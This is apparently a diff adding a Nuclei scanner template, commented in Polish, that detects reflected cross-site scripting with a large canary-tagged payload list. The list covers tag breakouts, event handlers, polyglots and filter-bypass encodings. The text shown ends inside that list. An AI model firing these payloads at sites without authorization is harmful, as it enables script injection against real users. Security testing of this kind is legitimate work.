@@ -1,0 +1,921 @@
+# ============================================================================
+# WSTG-INPV-01: Reflected Cross-Site Scripting (Universal)
+# ============================================================================
+#
+# Review status: POPRAWIONY
+# Reviewer: Claude Code (Opus 4.7)
+# Review date: 2026-04-30
+# Zmiany: dodany drugi http block (OOB) z matcherem `part: interactsh_protocol`.
+#   Wykrywa scenariusze blind XSS gdzie payload ładuje resource z attacker URL
+#   (np. img/script src=//interactsh) - sam fakt requestu z serwera/przeglądarki
+#   na interactsh server to evidence wykonania payloadu w kontekście DOM.
+#   Idiomatyczny pattern z dast/.../blind-ssrf.yaml.
+#
+# Powód decyzji (przed poprawką): Szablon spełnia wszystkie 6 kryteriów review:
+#   (1) Coverage Matrix obecna i wyczerpująca (3 wymiary: konteksty / techniki /
+#       mode delivery + wyraźne ✗ poza skalą)
+#   (2) Matchery 7-warstwowe: dangerous-reflection (regex 5 wzorców) + renderable
+#       Content-Type + 5 anti-FP (escape, WAF block, timeout, CSRF rejection,
+#       auth rejection); matchers-condition: and
+#   (3) Source comments per GROUP - 25 grup payloadów, każda z atrybucją do
+#       PayloadsAllTheThings / seclists / hacktricks / PortSwigger
+#   (4) Safety nets: pre-condition z blocklistą destrukcyjnych ścieżek, filtr
+#       statycznych zasobów, OPTIONS/HEAD/DELETE skip, anti-CSRF/anti-WAF/anti-401
+#       w matcherach. Rate-limit/429 handling jest świadomie na poziomie
+#       wrapper script (run-wstg-suite.sh), nie per-template.
+#   (5) Sweet spot: ~440 payloadów - mieści się w "high" budgecie (XSS to
+#       największa kategoria, sweet spot 200-500)
+#   (6) Component fuzzing wszystkie 5 części: query, body, cookie, path, header
+# Dodatkowo: OOB opcjonalne przez tag, canary z exclusion ambiguous chars,
+# extractors zwracają detected-context (html-tag/event-handler/js-uri/js-string).
+# ============================================================================
+#
+# Coverage Matrix:
+#
+# Konteksty (Context dimension):
+#   ✓ HTML body (między tagami)
+#   ✓ HTML attribute (w cudzysłowach, bez, z eventem)
+#   ✓ HTML attribute URL (href, src, action, formaction → javascript:/data:)
+#   ✓ JavaScript string literal (' / ")
+#   ✓ JavaScript template literal (`)
+#   ✓ CSS value (style="...")
+#   ✓ JSON response (Content-Type pivot indicator)
+#   ✓ SVG context (onload, animate, set)
+#   ✓ HTTP header reflected (Location, Set-Cookie, X-* headers)
+#   ✗ Markdown rendering (wymaga osobnego szablonu - rendering server-side)
+#   ✗ PDF rendering (wymaga osobnego szablonu - PDFKit/wkhtmltopdf)
+#   ✗ DOM-based - wymaga headless (poza skalą fuzzing engine)
+#
+# Techniki (Technique dimension):
+#   ✓ Klasyczne tagi (script, img, svg, iframe, body, details, video, audio)
+#   ✓ Event handlers (onerror, onload, onfocus, onmouseover, ~50 wariantów)
+#   ✓ JS bez nawiasów (throw, onerror=eval, location=, setTimeout`...`)
+#   ✓ JS bez cudzysłowów (String.fromCharCode, atob, /regex/.source)
+#   ✓ Tag mutation (HTML5, custom elements, <x onfocus=...>)
+#   ✓ Polyglots (0xsobky Ultimate, BRUTELOGIC, Jhaddix)
+#   ✓ Encoding bypass (URL %3C, double-URL %253C, HTML entities, <, \x3c)
+#   ✓ Whitespace bypass (%09 %0a %0d %0c %a0 / +)
+#   ✓ Case manipulation (<ScRiPt>, <SVG>)
+#   ✓ Tag nesting (<scr<script>ipt>)
+#   ✓ JS comment injection (// /* */ <!---->)
+#   ✓ URL schema bypass (javascript:, data:, vbscript:)
+#   ✗ DOM Clobbering - wymaga headless
+#   ✗ Mutation XSS (mXSS) - wymaga headless
+#   ✗ Markdown XSS - osobny szablon
+#
+# Mode delivery:
+#   ✓ Synchroniczne reflection (canary echo)
+#   ✓ Reflected w error pages (4xx/5xx) - matcher nie filtruje statusu
+#   ✗ Stored - osobny WSTG-INPV-02 (świadomy skip - patrz README)
+#   ✓ Blind/OOB - opcjonalne, włączane przez `-tags oob` (interactsh)
+#
+# Performance budget: medium (~440 payloads × 5 części × 1 endpoint)
+# Estimated time: ~15-30 min na typowej aplikacji z 50-100 endpointów
+#
+# Source hierarchy:
+#   1. PayloadsAllTheThings/XSS Injection/Intruders/* (BRUTELOGIC, IntrudersXSS, RSNAKE)
+#   2. seclists/Fuzzing/XSS/Polyglots/* (0xsobky, Dmiessler)
+#   3. seclists/Fuzzing/HTML5sec-Injections-Jhaddix.txt
+#   4. hacktricks/.../xss-cross-site-scripting (WAF bypass, filter bypass)
+#   5. PortSwigger XSS Cheat Sheet (event handlers)
+# ============================================================================
+
+id: wstg-inpv-01-reflected-xss
+
+info:
+  name: "WSTG-INPV-01: Reflected Cross-Site Scripting (Universal)"
+  author: pentest-team
+  severity: high
+  description: |
+    Uniwersalny szablon do wykrywania Reflected XSS pokrywający wszystkie konteksty
+    odbicia (HTML body, atrybuty, JS, CSS, URL, SVG) oraz typowe techniki bypassu
+    filtrów (encoding, whitespace, case, tag mutation, polyglots).
+    Szablon używa kanarka {{canary}} osadzonego w niebezpiecznych payloadach -
+    wykrycie kanarka w surowej formie w odpowiedzi (np. <kanarek>) oznacza brak
+    sanityzacji i potwierdza podatność. Matchery są wielowarstwowe (primary +
+    secondary content-type + anti-FP) co minimalizuje fałszywe alarmy.
+    Działa przeciwko eksportowi historii z Burp Suite (input-mode burp).
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting
+    - https://owasp.org/www-project-application-security-verification-standard/
+    - https://owasp.org/www-community/xss-filter-evasion-cheatsheet
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+    - https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting
+    - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+  classification:
+    cwe-id: CWE-79
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 6.1
+  tags: dast,wstg,wstg-v42-inpv-01,xss,reflected-xss,asvs-v5.3.1,asvs-v5.3.3,burp-history
+
+# Zmienne template'u:
+# - canary: losowy token osadzany w payloadach. Jego pojawienie się w surowej
+#   formie HTML w odpowiedzi (np. <CANARY> bez encodingu) potwierdza odbicie.
+# - auth_token / session_cookie: opcjonalne overrides przekazywane przez
+#   `nuclei -V auth_token=Bearer... -V session_cookie=...`. Jeśli są niepuste,
+#   skrypt run-wstg-inpv-suite.sh wstrzykuje je przez `-H` na poziomie nuclei.
+#   UWAGA: w pure-YAML fuzzing nie da się warunkowo nadpisać headera bez
+#   podmiany wszystkich requestów - dlatego override jest realizowany przez
+#   wrapper bash (patrz scripts/run-wstg-inpv-suite.sh).
+variables:
+  canary: "x{{rand_text_alpha(8, \"oOiIlL01\")}}x"
+  auth_token: ""
+  session_cookie: ""
+
+http:
+  - # Pre-condition: filtruje requesty na poziomie request-only data (nie ma
+    # tu jeszcze odpowiedzi). Tu kalibrujemy gdzie ma sens fuzzing XSS.
+    pre-condition:
+      - type: dsl
+        dsl:
+          # Pomiń OPTIONS/HEAD (preflight i sanity checks - bez sensu fuzzować)
+          - 'method != "OPTIONS"'
+          - 'method != "HEAD"'
+          # Pomiń statyczne zasoby - fuzzing CSS/JS/obrazków to czysty noise
+          - '!regex("(?i)\\.(js|css|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|otf|eot|map|pdf|zip|tar|gz|mp4|webm|mp3|wav)(\\?|$)", path)'
+          # Blocklist destrukcyjnych ścieżek - fuzzing XSS w endpoincie
+          # /users/123/delete to katastrofa. Override: --include-destructive
+          # we wrapperze powoduje że ten szablon nie jest filtrowany przez
+          # blocklist (bash przekazuje wtedy -V allow_destructive=true ale
+          # z perspektywy YAML i tak DSL to wymusza chyba że ustawione).
+          # Tu używamy prostej reguły: jeśli `allow_destructive` zmienna nie
+          # jest ustawiona na "true", filtruj.
+          - '!regex("(?i)/(delete|cancel|drop|destroy|remove|purge|wipe|reset|terminate|logout|signout)(/|$|\\?)", path)'
+          # Pomiń DELETE method - tylko bezpieczne metody dla XSS fuzzingu
+          - 'method != "DELETE"'
+          # Pomiń requests bez query stringa, ciała ani ciasteczek - nic do fuzzowania
+          # (oszczędza tysiące pustych requestów na typowej aplikacji)
+        condition: and
+
+    payloads:
+      # ========================================================================
+      # Wszystkie payloady zawierają {{canary}} - losowy unikalny token.
+      # Detekcja polega na pojawieniu się kanarka w niebezpiecznym kontekście
+      # w odpowiedzi (otoczony przez <, ", javascript:, on... itd.) BEZ encodingu.
+      # ========================================================================
+      xss:
+        # ====================================================================
+        # GROUP 1: Multi-context probes (canary jako pseudo-tag)
+        # Kalibracja: każdy probe próbuje wyrwać się z kontekstu i wstawić
+        # canary jako fragment HTML/JS który MUSI być widoczny w surowej formie
+        # gdyby się odbił. To "smoke detector" przed grupami specjalistycznymi.
+        # Source: WSTG examples + własna kalibracja
+        # ====================================================================
+        - "'\"><{{canary}}>"                          # break attr+tag, canary jako tag
+        - "\"'><{{canary}}>"                          # alternative ordering
+        - "'><{{canary}}>"                            # tylko single quote
+        - "\"><{{canary}}>"                           # tylko double quote
+        - "><{{canary}}>"                             # bez quotes (bare attr)
+        - "</textarea><{{canary}}>"                   # textarea breakout
+        - "</title><{{canary}}>"                      # title breakout
+        - "</style><{{canary}}>"                      # CSS context breakout
+        - "</script><{{canary}}>"                     # JS context breakout (script tag)
+        - "</noscript><{{canary}}>"                   # noscript breakout
+        - "</option><{{canary}}>"                     # select option breakout
+        - "</iframe><{{canary}}>"                     # iframe srcdoc breakout
+        - "*/</style><{{canary}}>"                    # CSS comment + breakout
+        - "*/</script><{{canary}}>"                   # JS comment + breakout
+        - "--></{{canary}}>"                          # HTML comment breakout
+
+        # ====================================================================
+        # GROUP 2: Klasyczne tagi z kanarkiem
+        # Source: PayloadsAllTheThings/XSS Injection/Intruders/IntrudersXSS.txt
+        # Każdy payload to osobny tag/wektor który nie jest pokryty innymi
+        # ====================================================================
+        - "<script>{{canary}}</script>"
+        - "<script>/*{{canary}}*/</script>"
+        - "<script src=//{{canary}}.example></script>"
+        - "<img src=x onerror={{canary}}()>"
+        - "<img src=x:{{canary}} onerror=eval(src)>"
+        - "<img/src=x onerror={{canary}}>"
+        - "<img src onerror={{canary}}>"
+        - "<svg onload={{canary}}()>"
+        - "<svg/onload={{canary}}()>"
+        - "<svg><animate attributeName=href values={{canary}} />"
+        - "<svg><script>{{canary}}</script></svg>"
+        - "<iframe src=javascript:{{canary}}()>"
+        - "<iframe srcdoc=<script>{{canary}}</script>>"
+        - "<body onload={{canary}}()>"
+        - "<body onpageshow={{canary}}()>"
+        - "<details open ontoggle={{canary}}()>"
+        - "<video><source onerror={{canary}}()>"
+        - "<audio src=x onerror={{canary}}()>"
+        - "<input onfocus={{canary}}() autofocus>"
+        - "<select onfocus={{canary}}() autofocus>"
+        - "<textarea onfocus={{canary}}() autofocus>"
+        - "<keygen onfocus={{canary}}() autofocus>"
+        - "<marquee onstart={{canary}}()>"
+        - "<object data=javascript:{{canary}}()>"
+        - "<embed src=javascript:{{canary}}()>"
+        - "<form action=javascript:{{canary}}()><input type=submit>"
+        - "<button formaction=javascript:{{canary}}()>X</button>"
+        - "<isindex action=javascript:{{canary}}() type=submit value=X>"
+        - "<table background=javascript:{{canary}}()>"
+        - "<a href=javascript:{{canary}}()>X</a>"
+        - "<link rel=stylesheet href=javascript:{{canary}}()>"
+        - "<base href=javascript:{{canary}}()//>"
+        - "<meta http-equiv=refresh content=0;url=javascript:{{canary}}()>"
+
+        # ====================================================================
+        # GROUP 3: Event handlers (autoryzowane wektory PortSwigger Cheat Sheet)
+        # Source: seclists/Fuzzing/XSS/port_swigger_xss_cheatsheet_event_handlers.txt
+        # Wystarczy odbicie w atrybucie aby event handler zadziałał - bardzo szeroka klasa
+        # ====================================================================
+        - "<svg onload={{canary}}>"
+        - "<body onload={{canary}}>"
+        - "<body onfocus={{canary}} autofocus>"
+        - "<body onhashchange={{canary}}>"
+        - "<body onresize={{canary}}>"
+        - "<body onbeforeunload={{canary}}>"
+        - "<body onpagehide={{canary}}>"
+        - "<body onpopstate={{canary}}>"
+        - "<body onmessage={{canary}}>"
+        - "<body onstorage={{canary}}>"
+        - "<body onunload={{canary}}>"
+        - "<input onfocus={{canary}} autofocus>"
+        - "<input onblur={{canary}} autofocus><input autofocus>"
+        - "<input onchange={{canary}}>"
+        - "<input oninput={{canary}}>"
+        - "<input oninvalid={{canary}}>"
+        - "<input onsearch={{canary}}>"
+        - "<input onselect={{canary}}>"
+        - "<form oninput={{canary}}><input>"
+        - "<form onreset={{canary}}><input type=reset>"
+        - "<form onsubmit={{canary}}><input type=submit>"
+        - "<details ontoggle={{canary}} open>X</details>"
+        - "<video oncanplay={{canary}}><source>"
+        - "<video onerror={{canary}}><source>"
+        - "<video onloadstart={{canary}}><source src=x>"
+        - "<video onsuspend={{canary}}><source src=x>"
+        - "<video oncanplaythrough={{canary}}><source>"
+        - "<audio oncanplay={{canary}}><source>"
+        - "<audio onloadeddata={{canary}}><source>"
+        - "<audio onloadedmetadata={{canary}}><source>"
+        - "<svg onafterprint={{canary}}>"
+        - "<svg onanimationend={{canary}}>"
+        - "<svg onanimationiteration={{canary}}>"
+        - "<svg onanimationstart={{canary}}>"
+        - "<svg onbegin={{canary}}>"
+        - "<svg onend={{canary}}>"
+        - "<svg onrepeat={{canary}}>"
+        - "<marquee onstart={{canary}}>X</marquee>"
+        - "<marquee onfinish={{canary}}>X</marquee>"
+        - "<marquee onbounce={{canary}}>X</marquee>"
+        - "<menu type=popup id=x onshow={{canary}}>"
+        - "<frameset onload={{canary}}>"
+        - "<select onchange={{canary}}><option>1<option>2"
+        - "<datalist onload={{canary}}>"
+
+        # ====================================================================
+        # GROUP 4: Tag/case mutation - bypass simple keyword filters
+        # Source: hacktricks/xss-cross-site-scripting/3 - XSS Common WAF Bypass.md
+        # ====================================================================
+        - "<sCrIpT>{{canary}}</sCrIpT>"
+        - "<SCRIPT>{{canary}}</SCRIPT>"
+        - "<ScRipt>{{canary}}</ScRipt>"
+        - "<scr<script>ipt>{{canary}}</scr<script>ipt>"      # nested filter bypass
+        - "<scr\x00ipt>{{canary}}</scr\x00ipt>"              # null byte
+        - "<<script>{{canary}}//<</script>"                   # double brackets
+        - "<script >{{canary}}</script >"                     # trailing space
+        - "<script\t>{{canary}}</script\t>"                   # tab in tag
+        - "<script\n>{{canary}}</script\n>"                   # newline in tag
+        - "<svG/onload={{canary}}>"                           # mixed case + slash
+        - "<SvG/oNlOaD={{canary}}>"
+        - "<IMG/SRC=X onerror={{canary}}>"
+        - "<iMg sRc=x OnErRoR={{canary}}>"
+        - "<x:script>{{canary}}</x:script>"                   # XML namespace
+        - "<sc<script>ript>{{canary}}</sc</script>ript>"      # nested closing
+        - "<script/x>{{canary}}</script>"                     # tag with garbage attr
+        - "<svgonload={{canary}}>"                            # no space (browser parses)
+        - "<x onclick={{canary}}>X</x>"                       # custom element
+
+        # ====================================================================
+        # GROUP 5: Polyglots - jeden payload, wiele kontekstów
+        # Source: seclists/Fuzzing/XSS/Polyglots/XSS-Polyglot-Ultimate-0xsobky.txt
+        # Każdy polyglot przerabia wiele filtrów na raz - wysoka wartość
+        # ====================================================================
+        - "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk={{canary}}() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd={{canary}}()//>\\x3e"
+        - "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/{{canary}}/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
+        - "\"><svg/onload={{canary}}() //"
+        - "\"><img src=x onerror={{canary}}() //"
+        - "'-{{canary}}()-'"                                   # JS string break
+        - "';{{canary}}();'"                                   # JS statement break
+        - "\";{{canary}}();\""
+        - "`-{{canary}}()-`"                                   # template literal break
+        - "${{ '{{' }}{{canary}}()}"                           # JS template injection (literal text - canary jako placeholder)
+        - "</script><svg onload={{canary}}>"
+        - "<!--<script>{{canary}}</script>-->"
+        - "<svg><![CDATA[><image xlink:href=]]><img src=1 onerror={{canary}}>"
+
+        # ====================================================================
+        # GROUP 6: JS context breakouts - kanarek odbity wewnątrz <script>
+        # Source: hacktricks JS context bypass
+        # ====================================================================
+        - "';{{canary}}//"
+        - "\";{{canary}}//"
+        - "'-{{canary}}-'"
+        - "\"-{{canary}}-\""
+        - "*/{{canary}}/*"
+        - "*/;{{canary}};/*"
+        - "</script><script>{{canary}}</script>"
+        - "${{'{{'}}{{canary}}{{'}}'}}"                                # template literal
+        - "`+{{canary}}+`"
+        - "');{{canary}}();//"
+        - "\");{{canary}}();//"
+        - "');{{canary}}//"
+        - "<\\/script><script>{{canary}}<\\/script>"           # JS escape close-tag
+
+        # ====================================================================
+        # GROUP 7: URL-context (href, src, action) - javascript: + data:
+        # Source: hacktricks 1 - XSS Filter Bypass.md
+        # ====================================================================
+        - "javascript:{{canary}}()"
+        - "javascript://{{canary}}()"
+        - "javascript:/*-/*`/*\\`/*'/*\"/**/{{canary}}()"
+        - "java%0ascript:{{canary}}()"                         # CRLF in scheme
+        - "java%09script:{{canary}}()"                         # tab in scheme
+        - "java%0d%0ascript:{{canary}}()"
+        - "JaVaScRiPt:{{canary}}()"
+        - "&#x6A;avascript:{{canary}}()"                       # hex entity
+        - "&#106;avascript:{{canary}}()"                       # decimal entity
+        - "data:text/html,<script>{{canary}}()</script>"
+        - "data:text/html;base64,PHNjcmlwdD57e2NhbmFyeX19KCk8L3NjcmlwdD4="
+        - "vbscript:{{canary}}()"                              # legacy IE
+        - "//{{canary}}.example"                                # protocol-relative
+
+        # ====================================================================
+        # GROUP 8: Encoding bypass - URL, double-URL, HTML entities, unicode, hex
+        # Reguła kombinatoryczna: 3+ wariantów encoding per kluczowy payload
+        # ====================================================================
+        # URL-encoded
+        - "%3Cscript%3E{{canary}}%3C/script%3E"
+        - "%3Csvg%2Fonload%3D{{canary}}%3E"
+        - "%3Cimg%20src%3Dx%20onerror%3D{{canary}}%3E"
+        # Double URL-encoded
+        - "%253Cscript%253E{{canary}}%253C/script%253E"
+        - "%253Csvg%2Fonload%3D{{canary}}%253E"
+        # HTML entities (decimal)
+        - "&#60;script&#62;{{canary}}&#60;/script&#62;"
+        - "&#x3c;script&#x3e;{{canary}}&#x3c;/script&#x3e;"
+        # Mixed
+        - "<scr%69pt>{{canary}}</scr%69pt>"
+        - "<%73cript>{{canary}}</%73cript>"
+        # Unicode escape (JS context)
+        - "<script>\\u0061lert({{canary}})</script>"
+        - "<script>\\u{61}lert({{canary}})</script>"
+        - "<script>eval('\\x61lert({{canary}})')</script>"
+        # String.fromCharCode (no quotes / no semicolons)
+        - "<script>eval(String.fromCharCode(97,108,101,114,116))({{canary}})</script>"
+        - "<img src=x onerror=eval(atob('YWxlcnQ='))({{canary}})>"
+        # Octal/Hex literals
+        - "<svg/onload={{canary}}&#x28;&#x29;>"
+        - "<svg/onload={{canary}}&#40;&#41;>"
+
+        # ====================================================================
+        # GROUP 9: Whitespace bypass - separator other than space
+        # Source: hacktricks WAF bypass + PortSwigger research
+        # ====================================================================
+        - "<svg%09onload={{canary}}>"                          # TAB
+        - "<svg%0Aonload={{canary}}>"                          # LF
+        - "<svg%0Donload={{canary}}>"                          # CR
+        - "<svg%0Conload={{canary}}>"                          # FF
+        - "<svg%2Fonload={{canary}}>"                          # /
+        - "<img%09src=x%09onerror={{canary}}>"
+        - "<img/src=x/onerror={{canary}}>"
+        - "<img\tsrc=x\tonerror={{canary}}>"                   # raw tab
+        - "<img\nsrc=x\nonerror={{canary}}>"                   # raw LF
+        - "<svg/x=\">\"/onload={{canary}}>"                    # nested attr
+        - "<svg onload={{canary}}>"                       # NBSP
+
+        # ====================================================================
+        # GROUP 10: HTML5 vectors (Jhaddix HTML5sec)
+        # Source: seclists/Fuzzing/HTML5sec-Injections-Jhaddix.txt (curated)
+        # ====================================================================
+        - "<form id=test><button form=test formaction=javascript:{{canary}}()>X</button>"
+        - "<input onfocus={{canary}} autofocus>"
+        - "<video poster=javascript:{{canary}}()></video>"
+        - "<svg xmlns=\"http://www.w3.org/2000/svg\"><g onload={{canary}}></g></svg>"
+        - "<body onscroll={{canary}}><br><br><br><br><input autofocus>"
+        - "<a style=\"-o-link:'javascript:{{canary}}()';-o-link-source:current\">X</a>"
+        - "<x style=`behavior:url(#default#time2)` onbegin=`{{canary}}()`>"
+        - "<?xml-stylesheet href=\"javascript:{{canary}}()\"?><root/>"
+        - "<svg><script xlink:href=data:,{{canary}}() /></svg>"
+        - "<svg><handler xmlns=\"http://www.w3.org/2001/xml-events\" ev:event=load>{{canary}}()</handler></svg>"
+        - "<a href=\"javascript&colon;{{canary}}()\">X</a>"
+        - "<a href=\"j&#x61;vascript:{{canary}}()\">X</a>"
+        - "<svg><a><animate attributeName=href values=javascript:{{canary}}() /><text x=20 y=20>X</text></a></svg>"
+        - "<svg><discard begin=\"0s\" attributeName=href values=javascript:{{canary}}()/></svg>"
+
+        # ====================================================================
+        # GROUP 11: CSS context (style=, <style>)
+        # Source: hacktricks CSS Injection
+        # ====================================================================
+        - "x:expression({{canary}}())"                         # legacy IE
+        - "background:url(javascript:{{canary}}())"            # legacy
+        - "</style><script>{{canary}}</script>"
+        - "</style><svg onload={{canary}}>"
+        - "*{x:expression({{canary}}())}"
+
+        # ====================================================================
+        # GROUP 12: Filter bypass (encoded keywords, weird formats)
+        # Source: hacktricks Common WAF Bypass + RSNAKE_XSS curated
+        # ====================================================================
+        - "<sc<x>ript>{{canary}}</sc<x>ript>"
+        - "<scrscriptipt>{{canary}}</scrscriptipt>"            # filter strips "script"
+        - "<isindex type=image src=1 onerror={{canary}}>"
+        - "<image src=x onerror={{canary}}>"                   # legacy <image>
+        - "<bgsound src=javascript:{{canary}}()>"              # legacy IE
+        - "<style>@import 'javascript:{{canary}}()'</style>"
+        - "<META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=<SCRIPT>{{canary}}</SCRIPT>\">"
+        - "<XML ID=I><X><C><![CDATA[<IMG SRC=javas]]><![CDATA[cript:{{canary}}()>]]></C></X></XML>"
+        - "<x contenteditable onbeforeinput={{canary}}>x</x>"
+        - "<x onauxclick={{canary}}>middle-click me</x>"
+
+        # ====================================================================
+        # GROUP 13: BRUTELOGIC top picks (curated)
+        # Source: seclists/Fuzzing/XSS/BRUTELOGIC-XSS-STRINGS.txt
+        # ====================================================================
+        - "<a href=javascript:{{canary}}()>X</a>"
+        - "<a href=javascript&colon;{{canary}}()>X</a>"
+        - "<x/onclick={{canary}}>click"
+        - "<svg><script>123<1>{{canary}}()</script>"
+        - "<sCript>{{canary}}()</sCript>"
+        - "<svg/onload=&#97;&#108;&#101;&#114;&#116;({{canary}})>"
+
+        # ====================================================================
+        # GROUP 14: Header reflection probes
+        # Niektóre aplikacje odbijają headery (Referer, User-Agent, X-Forwarded-Host)
+        # bez sanityzacji w error pages. Te payloady fuzzują headery.
+        # ====================================================================
+        - "{{canary}}\"><script>alert(1)</script>"
+        - "{{canary}}'><img src=x onerror=alert(1)>"
+        - "{{canary}}<svg/onload=alert(1)>"
+
+        # ====================================================================
+        # GROUP 15: Number/identifier-context (kanarek bez quotes)
+        # JS: var x={{canary}}; - kontekst numeryczny
+        # ====================================================================
+        - ";{{canary}};"
+        - "+{{canary}}+"
+        - "*1;{{canary}}//"
+        - "-1;{{canary}}//"
+
+        # ====================================================================
+        # GROUP 16: SVG-specific advanced
+        # Source: HTML5sec Jhaddix + MarioXSSVectors
+        # ====================================================================
+        - "<svg><animate xlink:href=#x attributeName=href values=javascript:{{canary}}() /><a id=x><rect width=100 height=100 /></a>"
+        - "<svg><set attributeName=onload value={{canary}}() />"
+        - "<svg><script>//&NewLine;{{canary}}()</script>"
+        - "<svg><foreignObject><iframe srcdoc=\"<script>{{canary}}()</script>\"></iframe></foreignObject></svg>"
+
+        # ====================================================================
+        # GROUP 17: iframe srcdoc + sandbox bypass
+        # ====================================================================
+        - "<iframe srcdoc='<script>{{canary}}()</script>'></iframe>"
+        - "<iframe srcdoc=\"&lt;script&gt;{{canary}}()&lt;/script&gt;\"></iframe>"
+        - "<iframe src=\"javascript:{{canary}}()\"></iframe>"
+
+        # ====================================================================
+        # GROUP 18: Noscript / template / meta vectors
+        # ====================================================================
+        - "<noscript><p title=\"</noscript><img src=x onerror={{canary}}>\">"
+        - "<template>{{canary}}</template>"
+        - "<meta http-equiv=\"refresh\" content=\"0;url=javascript:{{canary}}()\">"
+        - "<meta charset=\"x-mac-farsi\">¼script ¾{{canary}}()//¼/script ¾"
+
+        # ====================================================================
+        # GROUP 19: Extended event handlers (0xcela ~105 unikalnych)
+        # Source: PayloadsAllTheThings/XSS Injection/Intruders/0xcela_event_handlers.txt
+        # Każdy handler aplikowany do bazowego <svg ...={{canary}}> - jeden
+        # nieobsłużony filtr eventu wystarczy aby payload zadziałał.
+        # ====================================================================
+        - "<svg onabort={{canary}}>"
+        - "<svg onactivate={{canary}}>"
+        - "<svg onafterscriptexecute={{canary}}>"
+        - "<svg onauxclick={{canary}}>"
+        - "<svg onbeforeactivate={{canary}}>"
+        - "<svg onbeforecopy={{canary}}>"
+        - "<svg onbeforecut={{canary}}>"
+        - "<svg onbeforedeactivate={{canary}}>"
+        - "<svg onbeforeinput={{canary}}>"
+        - "<svg onbeforematch={{canary}}>"
+        - "<svg onbeforepaste={{canary}}>"
+        - "<svg onbeforeprint={{canary}}>"
+        - "<svg onbeforescriptexecute={{canary}}>"
+        - "<svg onbeforetoggle={{canary}}>"
+        - "<svg onbeforeunload={{canary}}>"
+        - "<svg onblur={{canary}}>"
+        - "<svg oncancel={{canary}}>"
+        - "<svg oncanplay={{canary}}>"
+        - "<svg oncanplaythrough={{canary}}>"
+        - "<svg oncellchange={{canary}}>"
+        - "<svg onchange={{canary}}>"
+        - "<svg onclick={{canary}}>"
+        - "<svg onclose={{canary}}>"
+        - "<svg oncommand={{canary}}>"
+        - "<svg oncompassneedscalibration={{canary}}>"
+        - "<svg oncontentvisibilityautostatechange={{canary}}>"
+        - "<svg oncontextlost={{canary}}>"
+        - "<svg oncontextmenu={{canary}}>"
+        - "<svg oncontextrestored={{canary}}>"
+        - "<svg oncontrolselect={{canary}}>"
+        - "<svg oncopy={{canary}}>"
+        - "<svg oncut={{canary}}>"
+        - "<svg ondataavailable={{canary}}>"
+        - "<svg ondatasetchanged={{canary}}>"
+        - "<svg ondatasetcomplete={{canary}}>"
+        - "<svg ondblclick={{canary}}>"
+        - "<svg ondeactivate={{canary}}>"
+        - "<svg ondevicemotion={{canary}}>"
+        - "<svg ondeviceorientation={{canary}}>"
+        - "<svg ondeviceorientationabsolute={{canary}}>"
+        - "<svg ondrag={{canary}}>"
+        - "<svg ondragend={{canary}}>"
+        - "<svg ondragenter={{canary}}>"
+        - "<svg ondragexit={{canary}}>"
+        - "<svg ondragleave={{canary}}>"
+        - "<svg ondragover={{canary}}>"
+        - "<svg ondragstart={{canary}}>"
+        - "<svg ondrop={{canary}}>"
+        - "<svg ondurationchange={{canary}}>"
+        - "<svg onemptied={{canary}}>"
+        - "<svg onended={{canary}}>"
+        - "<svg onerror={{canary}}>"
+        - "<svg onerrorupdate={{canary}}>"
+        - "<svg onfilterchange={{canary}}>"
+        - "<svg onfinish={{canary}}>"
+        - "<svg onfocusin={{canary}}>"
+        - "<svg onfocusout={{canary}}>"
+        - "<svg onformdata={{canary}}>"
+        - "<svg onfullscreenchange={{canary}}>"
+        - "<svg onfullscreenerror={{canary}}>"
+        - "<svg ongotpointercapture={{canary}}>"
+        - "<svg onhashchange={{canary}}>"
+        - "<svg onhelp={{canary}}>"
+        - "<svg oninvalid={{canary}}>"
+        - "<svg onkeydown={{canary}}>"
+        - "<svg onkeypress={{canary}}>"
+        - "<svg onkeyup={{canary}}>"
+        - "<svg onlanguagechange={{canary}}>"
+        - "<svg onlayoutcomplete={{canary}}>"
+        - "<svg onloadeddata={{canary}}>"
+        - "<svg onloadedmetadata={{canary}}>"
+        - "<svg onloadend={{canary}}>"
+        - "<svg onloadstart={{canary}}>"
+        - "<svg onlosecapture={{canary}}>"
+        - "<svg onlostpointercapture={{canary}}>"
+        - "<svg onmousedown={{canary}}>"
+        - "<svg onmouseenter={{canary}}>"
+        - "<svg onmouseleave={{canary}}>"
+        - "<svg onmousemove={{canary}}>"
+        - "<svg onmouseout={{canary}}>"
+        - "<svg onmouseover={{canary}}>"
+        - "<svg onmouseup={{canary}}>"
+        - "<svg onmousewheel={{canary}}>"
+        - "<svg onmove={{canary}}>"
+        - "<svg onmoveend={{canary}}>"
+        - "<svg onmovestart={{canary}}>"
+        - "<svg onpaste={{canary}}>"
+        - "<svg onpause={{canary}}>"
+        - "<svg onplay={{canary}}>"
+        - "<svg onplaying={{canary}}>"
+        - "<svg onpointercancel={{canary}}>"
+        - "<svg onpointerdown={{canary}}>"
+        - "<svg onpointerenter={{canary}}>"
+        - "<svg onpointerleave={{canary}}>"
+        - "<svg onpointermove={{canary}}>"
+        - "<svg onpointerout={{canary}}>"
+        - "<svg onpointerover={{canary}}>"
+        - "<svg onpointerrawupdate={{canary}}>"
+        - "<svg onpointerup={{canary}}>"
+        - "<svg onprogress={{canary}}>"
+        - "<svg onpropertychange={{canary}}>"
+        - "<svg onratechange={{canary}}>"
+        - "<svg onreadystatechange={{canary}}>"
+        - "<svg onresize={{canary}}>"
+        - "<svg onrowenter={{canary}}>"
+        - "<svg onrowexit={{canary}}>"
+        - "<svg onrowsdelete={{canary}}>"
+        - "<svg onrowsinserted={{canary}}>"
+        - "<svg onscroll={{canary}}>"
+        - "<svg onscrollend={{canary}}>"
+        - "<svg onsearch={{canary}}>"
